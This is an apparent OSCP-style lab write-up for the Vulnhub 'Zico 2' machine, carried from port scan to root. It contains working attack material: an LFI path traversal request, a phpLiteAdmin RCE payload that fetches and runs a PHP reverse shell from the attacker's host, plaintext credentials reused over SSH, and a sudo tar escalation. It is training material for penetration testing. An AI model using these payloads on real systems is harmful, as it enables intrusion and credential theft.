# OSCP Vulnhub Set 1 - Zico 2

Lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=2bd816c6-a344-4397-9e5e-027546fb11c5

Target IP: 10.101.85.29

---

## Scanning and Enumeration

### Nmap

Performed an initial network scan to discover open ports.

```
nmap -Pn 10.101.85.29
```

The scan revealed open ports for SSH, HTTP, and rpcbind.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/14]
└─$ nmap -Pn 10.101.85.29           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 02:16 -0400
Nmap scan report for 10.101.85.29
Host is up (0.0020s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

### Web Enumeration

Navigated to the target IP address in a web browser.

```
http://10.101.85.29/
```

The main page did not reveal any significant information.

![](./images/01.png)

The page source revealed a link pointing to /view.php?page=tools.html, suggesting a potential Local File Inclusion (LFI) vulnerability within the page parameter.

```
[...snip...]

<a href="/view.php?page=tools.html" class="btn btn-default btn-xl sr-button">Check them out!</a>

[...snip...]
```

---

### Burp Suit

Intercepted the HTTP request using Burp Suite and forwarded it to the Repeater module.

```
http://10.101.85.29/view.php?page=tools.html
```

The request was successfully captured in the Repeater tab.

![](./images/02.png)


Modified the page parameter payload to ../../../../../etc/passwd to test for a Local File Inclusion (LFI) vulnerability.

```
GET /view.php?page=../../../../../etc/passwd HTTP/1.1
```

The server executed the path traversal and returned the contents of the file, confirming the LFI vulnerability.

![](./images/03.png)

---

### Directory Enumeration

Performed a directory brute-force attack using Gobuster to discover hidden directories and files on the web server.

```
gobuster dir -u http://10.101.85.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
```

The scan revealed an interesting directory named /dbadmin/.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/14]
└─$ gobuster dir -u http://10.101.85.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.101.85.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 7970]
index.html           (Status: 200) [Size: 7970]
img                  (Status: 301) [Size: 310] [--> http://10.101.85.29/img/]
tools                (Status: 200) [Size: 8355]
tools.html           (Status: 200) [Size: 8355]
view                 (Status: 200) [Size: 0]
view.php             (Status: 200) [Size: 0]
css                  (Status: 301) [Size: 310] [--> http://10.101.85.29/css/]
js                   (Status: 301) [Size: 309] [--> http://10.101.85.29/js/]
vendor               (Status: 301) [Size: 313] [--> http://10.101.85.29/vendor/]
package              (Status: 200) [Size: 789]
LICENSE              (Status: 200) [Size: 1094]
less                 (Status: 301) [Size: 311] [--> http://10.101.85.29/less/]
server-status        (Status: 403) [Size: 293]
dbadmin              (Status: 301) [Size: 314] [--> http://10.101.85.29/dbadmin/]
Progress: 1102790 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

Navigated to the discovered directory in a web browser.

```
http://10.101.85.29/dbadmin/
```

A file named test_db.php was found inside the directory listing.

![](./images/04.png)

Accessed the test_db.php file to view its content.

```
http://10.101.85.29/dbadmin/test_db.php
```

The page granted direct access to the phpLiteAdmin v1.9.3 database management interface without requiring authentication.

![](./images/05.png)

---

## Exploitation

### phpLiteAdmin v1.9.3 - Remote Code Execution (EDB-24044)

Identified a Remote Code Execution (RCE) vulnerability targeting phpLiteAdmin v1.9.3 via Exploit-DB (EDB-24044). The vulnerability allows an attacker to inject PHP code by creating a new database file with a .php extension, which can then be executed via the previously discovered Local File Inclusion (LFI) vulnerability.

```
https://www.exploit-db.com/exploits/24044
```

Prepared a PHP reverse shell payload on the Kali machine.

```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Configured the reverse shell script with the local attacker IP and port.

```
nano php-reverse-shell.php
# $ip = '10.101.55.195';  // CHANGE THIS
# $port = 1234;       // CHANGE THIS
```

Set up a Netcat listener on port 1234 to capture the incoming shell.

```
nc -lvp 1234
```

Started a Python HTTP server to host the configured reverse shell script.

```
python -m http.server 8000
```

Navigated to the phpLiteAdmin panel and created a new database named hack.php.

![](./images/06.png)

Created a new table within the hack.php database.

![](./images/07.png)

Injected a PHP payload into a table field. The payload is designed to download the full reverse shell script into the /tmp directory and execute it using the CLI PHP interpreter.

```
<?php system("wget http://10.101.55.195:8000/php-reverse-shell.php -O /tmp/reverse-shell.php; php /tmp/reverse-shell.php"); ?>
```

Saved the field configuration to write the payload into the database file structure.

![](./images/08.png)

Triggered the payload execution by leveraging the LFI vulnerability to include the newly created database file located at /usr/databases/hack.php.

```
http://10.101.85.29/view.php?page=../../../../usr/databases/hack.php
```

The Netcat listener successfully received the connection, providing an interactive shell as the www-data user.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/14]
└─$ nc -lvp 1234
listening on [any] 1234 ...
10.101.85.29: inverse host lookup failed: Unknown host
connect to [10.101.55.195] from (UNKNOWN) [10.101.85.29] 47690
Linux zico 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
 02:39:37 up 1 day, 19:20,  0 users,  load average: 0.00, 0.03, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Privilege Escalation

### Internal Enumeration

Enumerated the target system's file structure and located a note named to_do.txt in the home directory of the user zico.

```
$ cat /home/zico/to_do.txt

try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress
```

Inspected the WordPress directory configuration file (wp-config.php) and discovered plaintext database credentials for the user zico.

```
$ cat /home/zico/wordpress/wp-config.php

[...snip...]

/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

[...snip...]
```

---

### SSH Access

Attempted to reuse the discovered password to authenticate via SSH as the user zico.

```
ssh zico@10.101.85.29
# password: sWfCsfJSPV9H3AmQzw8
```

The credentials were valid, granting a secure shell session on the target host.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/14]
└─$ ssh zico@10.101.85.29        
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
zico@10.101.85.29's password: 
zico@zico:~$ id
uid=1000(zico) gid=1000(zico) groups=1000(zico)
```

---

### Sudo Rights Enumeration

Checked the available sudo privileges for the zico user account.

```
sudo -l
```

The output indicated that the user can execute /bin/tar and /usr/bin/zip as root without a password. These binaries can be abused via GTFOBins exploitation methods to escalate privileges to root.

```
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

---

### GTFOBins Exploitation (tar)

Referenced GTFOBins to locate a privilege escalation vector for the /bin/tar binary utilizing the misconfigured sudo permissions.

```
https://gtfobins.org/gtfobins/tar/
```

Executed the tar command with sudo privileges, leveraging the --checkpoint and --checkpoint-action parameters to trigger shell execution.

```
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

The command successfully broke out of the binary constraints, spawning a shell with root privileges.

```
zico@zico:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```